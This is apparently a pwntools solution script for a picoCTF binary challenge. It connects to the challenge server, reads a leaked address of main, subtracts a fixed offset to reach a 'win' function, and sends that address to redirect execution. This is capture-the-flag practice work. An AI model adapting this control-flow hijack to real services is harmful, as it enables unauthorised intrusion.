from pwn import *

host = "rescued-float.picoctf.net"
port = 52331

# p = process("./vuln")
p = remote(host, port)

offset = 0x96

p.recvuntil(b'Address of main: ', drop=True)
main_addr = p.recvuntil(b'\n', drop=True)
win_addr = int(main_addr.decode(), 16) - offset
print(main_addr)
print(hex(win_addr))

payload= hex(win_addr)

p.sendline(payload)
p.interactive()
#
# print(main_addr)
